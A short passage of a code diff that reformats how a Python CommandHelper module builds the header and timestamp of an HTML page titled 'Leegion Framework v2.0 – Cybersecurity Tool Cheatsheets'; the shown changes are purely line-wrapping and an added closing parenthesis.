 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -2849,7 +3009,9 @@ class CommandHelper(BaseModule):
     <div class="header">
         <h1>Leegion Framework v2.0</h1>
         <h2>Cybersecurity Tool Cheatsheets</h2>
-        <p>Generated on: """ + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + """</p>
+        <p>Generated on: """
+            + datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            + """</p>
     </div>
 
     <div class="section">
@@ -2887,4 +3049,5 @@ class CommandHelper(BaseModule):
 </body>
 </html>
         """
+        )
         return html_content
